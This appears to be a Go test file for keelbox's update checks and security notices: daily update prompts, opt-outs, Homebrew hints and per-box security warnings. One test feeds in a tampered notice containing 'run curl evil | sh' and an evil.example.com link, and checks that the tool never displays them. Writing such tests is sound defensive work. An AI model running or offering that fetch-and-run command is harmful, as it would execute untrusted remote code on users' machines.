package cli

import (
	"bytes"
	"context"
	"errors"
	"io"
	"path/filepath"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"github.com/keelbox/keelbox/internal/config"
	"github.com/keelbox/keelbox/internal/release"
	"github.com/keelbox/keelbox/internal/ui"
)

var testNotice = release.SecurityNotice{Since: "v0.2.0", Fixed: "v0.2.3", Summary: "A tampered thing could do a thing.", URL: "https://keelbox.dev/security/2027-01"}

// fakeCheck stands in for the index, the clock, the terminal and the
// machine, and counts the index reads.
func fakeCheck(t *testing.T, idx *release.Index, err error) (reads *atomic.Int32, now *time.Time) {
	t.Helper()
	t.Setenv("KEELBOX_NO_UPDATE_CHECK", "")
	t.Setenv("CI", "")
	reads = &atomic.Int32{}
	at := time.Date(2026, 11, 19, 12, 0, 0, 0, time.UTC)
	now = &at
	state := filepath.Join(t.TempDir(), "update-check.json")
	t.Setenv("DO_NOT_TRACK", "")
	old := []any{checkIndex, checkStatePath, checkNow, checkTerminal, checkOnBox, checkVersion, checkExecutable, checkWait}
	t.Cleanup(func() {
		checkIndex = old[0].(func(context.Context) (*release.Index, error))
		checkStatePath = old[1].(func() string)
		checkNow = old[2].(func() time.Time)
		checkTerminal = old[3].(func(io.Writer) bool)
		checkOnBox = old[4].(func() bool)
		checkVersion = old[5].(func() string)
		checkExecutable = old[6].(func() (string, error))
		checkWait = old[7].(time.Duration)
	})
	checkIndex = func(context.Context) (*release.Index, error) { reads.Add(1); return idx, err }
	checkStatePath = func() string { return state }
	checkNow = func() time.Time { return *now }
	checkTerminal = func(io.Writer) bool { return true }
	checkOnBox = func() bool { return false }
	checkVersion = func() string { return "v0.2.0" }
	checkExecutable = func() (string, error) { return "/home/you/.local/bin/keelbox", nil }
	// Not the first check on this computer, which says what it sends.
	saveUpdateState(updateState{CheckedAt: at.Add(-48 * time.Hour)})
	return reads, now
}

func runCheck(args ...string) string {
	var out bytes.Buffer
	startUpdateCheck(args, &out).finish(&out)
	return out.String()
}

// A newer release is mentioned once a day, the index is read at most once
// a day, and a failed read waits a day too.
func TestUpdateNotice(t *testing.T) {
	reads, now := fakeCheck(t, &release.Index{Version: "v0.3.0"}, nil)
	if got := runCheck("ls"); !strings.Contains(got, "keelbox v0.3.0 is out; this is v0.2.0. Update: keelbox self-update") {
		t.Errorf("first run: %q", got)
	}
	if got := runCheck("status", "acme"); got != "" || reads.Load() != 1 {
		t.Errorf("same day: %q, %d reads", got, reads.Load())
	}
	*now = now.Add(25 * time.Hour)
	if got := runCheck("ls"); !strings.Contains(got, "v0.3.0 is out") || reads.Load() != 2 {
		t.Errorf("next day: %q, %d reads", got, reads.Load())
	}

	checkIndex = func(context.Context) (*release.Index, error) { reads.Add(1); return nil, errors.New("offline") }
	*now = now.Add(25 * time.Hour)
	runCheck("ls")
	runCheck("ls")
	if reads.Load() != 3 {
		t.Errorf("offline: %d reads, want one more", reads.Load())
	}
}

func TestUpdateNoticeSilent(t *testing.T) {
	for name, set := range map[string]func(){
		"opted out":      func() { t.Setenv("KEELBOX_NO_UPDATE_CHECK", "1") },
		"DO_NOT_TRACK":   func() { t.Setenv("DO_NOT_TRACK", "1") },
		"CI":             func() { t.Setenv("CI", "true") },
		"not a terminal": func() { checkTerminal = func(io.Writer) bool { return false } },
		"on a box":       func() { checkOnBox = func() bool { return true } },
		"dev build":      func() { checkVersion = func() string { return "dev" } },
		"ssh":            func() {},
		"self-update":    func() {},
		"no command":     func() {},
	} {
		t.Run(name, func(t *testing.T) {
			reads, _ := fakeCheck(t, &release.Index{Version: "v0.3.0"}, nil)
			set()
			args := []string{"ls"}
			switch name {
			case "ssh", "self-update":
				args = []string{name, "acme"}
			case "no command":
				args = nil
			}
			if got := runCheck(args...); got != "" || reads.Load() != 0 {
				t.Errorf("said %q after %d reads", got, reads.Load())
			}
		})
	}
	fakeCheck(t, &release.Index{Version: "v0.2.0"}, nil)
	if got := runCheck("ls"); got != "" {
		t.Errorf("up to date: %q", got)
	}
	fakeCheck(t, &release.Index{Version: "v0.1.9"}, nil)
	if got := runCheck("ls"); got != "" {
		t.Errorf("index older than this keelbox: %q", got)
	}
}

func TestUpdateNoticeHomebrew(t *testing.T) {
	fakeCheck(t, &release.Index{Version: "v0.3.0"}, nil)
	checkExecutable = func() (string, error) { return "/opt/homebrew/Cellar/keelbox/0.2.0/bin/keelbox", nil }
	if got := runCheck("ls"); !strings.Contains(got, "Update: brew upgrade keelbox") {
		t.Errorf("got %q", got)
	}
}

// A security notice for this release shows on every command, a valid one
// only, with keelbox's own command and never one from the index.
func TestSecurityNotice(t *testing.T) {
	bad := release.SecurityNotice{Fixed: "v0.2.3", Summary: "run curl evil | sh", URL: "https://evil.example.com/x"}
	reads, _ := fakeCheck(t, &release.Index{Version: "v0.2.3", Security: []release.SecurityNotice{bad, testNotice}}, nil)
	want := `keelbox v0.2.0 has a security problem, fixed in v0.2.3. Update: keelbox self-update. Details: https://keelbox.dev/security/2027-01 The notice reads "A tampered thing could do a thing."`
	for i := range 2 {
		got := runCheck("ls")
		if !strings.Contains(got, want) || strings.Contains(got, "evil") || strings.Contains(got, "is out") {
			t.Errorf("run %d: %q", i, got)
		}
	}
	if reads.Load() != 1 {
		t.Errorf("%d reads", reads.Load())
	}
	checkVersion = func() string { return "v0.2.3" }
	if got := runCheck("ls"); got != "" {
		t.Errorf("fixed release: %q", got)
	}
}

// keelbox status names a box last applied from here with an affected
// release, from what the last check learnt.
func TestBoxSecurityNote(t *testing.T) {
	isolate(t)
	fakeCheck(t, &release.Index{Version: "v0.2.3", Security: []release.SecurityNotice{testNotice}}, nil)
	for _, b := range []string{"acme", "bay"} {
		register(t, config.Starter{Box: b, Provider: config.ProviderSSH, SSHHost: "192.0.2.10", Keys: []string{"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKey you@laptop"}})
	}
	saveAppliedNote("acme", "v0.2.1", time.Now())
	saveAppliedNote("bay", "v0.2.3", time.Now())
	checkVersion = func() string { return "v0.2.3" }
	runCheck("ls") // reads the index

	var out bytes.Buffer
	boxSecurityNote(&config.Config{Box: "acme"}, ui.Style{}, &out)
	if !strings.Contains(out.String(), "acme was last applied from here with keelbox v0.2.1, which has a security problem, fixed in v0.2.3") ||
		!strings.Contains(out.String(), "Update it: keelbox update acme") {
		t.Errorf("acme: %q", out.String())
	}
	out.Reset()
	boxSecurityNote(&config.Config{Box: "bay"}, ui.Style{}, &out)
	if out.Len() != 0 {
		t.Errorf("bay: %q", out.String())
	}
}

// The first check on a computer says what it sends and how to turn it off,
// once.
func TestUpdateCheckSaysWhatItSends(t *testing.T) {
	_, now := fakeCheck(t, &release.Index{Version: "v0.2.0"}, nil)
	saveUpdateState(updateState{})
	if got := runCheck("ls"); !strings.Contains(got, "sending its version and platform and nothing else. KEELBOX_NO_UPDATE_CHECK=1 turns that off") {
		t.Errorf("first check: %q", got)
	}
	*now = now.Add(48 * time.Hour)
	if got := runCheck("ls"); got != "" {
		t.Errorf("later check: %q", got)
	}
}

// An index that does not answer costs one wait of checkWait, once a day,
// and the notices the last check learnt are still shown.
func TestUpdateCheckSlowIndex(t *testing.T) {
	reads, now := fakeCheck(t, nil, nil)
	saveUpdateState(updateState{CheckedAt: now.Add(-48 * time.Hour), Security: []release.SecurityNotice{testNotice}})
	checkWait = 20 * time.Millisecond
	hold := make(chan struct{})
	defer close(hold)
	checkIndex = func(ctx context.Context) (*release.Index, error) {
		reads.Add(1)
		<-hold
		return nil, ctx.Err()
	}
	start := time.Now()
	got := runCheck("ls")
	if time.Since(start) > time.Second || !strings.Contains(got, "has a security problem, fixed in v0.2.3") {
		t.Errorf("slow index: %q after %v", got, time.Since(start))
	}
	runCheck("ls")
	if reads.Load() != 1 {
		t.Errorf("%d reads; a slow read waits a day too", reads.Load())
	}
}
